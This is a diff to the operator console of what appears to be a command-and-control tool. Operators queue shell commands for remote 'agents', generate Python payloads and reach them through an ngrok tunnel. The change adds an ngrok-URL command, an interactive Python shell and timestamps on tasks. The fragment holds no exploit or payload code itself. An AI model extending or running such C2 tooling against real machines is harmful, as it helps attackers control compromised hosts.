@@ -9,6 +9,7 @@ from getpass import getpass
 from uuid import uuid4
 from subprocess import Popen, PIPE
 import time, _thread, os
+import code#, pdb
 
 author = config.info()
 
@@ -31,6 +32,8 @@ man = {
         'getResult':'Show result for specific task. Usage: \'getResult 102\'',
         'genPayload':'Generates a payload. Usage: \'genPayload python3\' (options: python3,)',
         'taskkill':'Removes a task from the tasklist. Usage: \'taskkill 301\' (replace \'301\' with task id)',
+        'ngrokUrl':'Gets the current ngrok url',
+        'python':'Enter an interactive python debugging shell',
         }
 
 def help_menu():
@@ -107,7 +110,7 @@ class Handler(object):
                                 return None
                         com = cmd.split('"')[1]
                         uid = str(uuid4())
-                        server.commands.append({'agent':var.current_agent,'id':uid,'cmd':com})
+                        server.commands.append({'agent':var.current_agent,'id':uid,'cmd':com,'time':time.time()})
                         print(ok("Command added to tasklist"))
                         return None
                 elif base == "startServer":
@@ -164,6 +167,15 @@ class Handler(object):
                                         return None
                         print(error("No command with that id found"))
                         return None
+                elif base == "ngrokUrl":
+                        print("Ngrok url: [%s]" % c(ngrok.get_url(),"green"))
+                        return None
+                elif base == "python":
+                        #pdb.set_trace()
+                        try:
+                                code.interact(local=dict(globals(), **locals()))
+                        except SystemExit:
+                                return None
                 else:
                         print(error("Command not found / Invalid syntax"))
                         return None
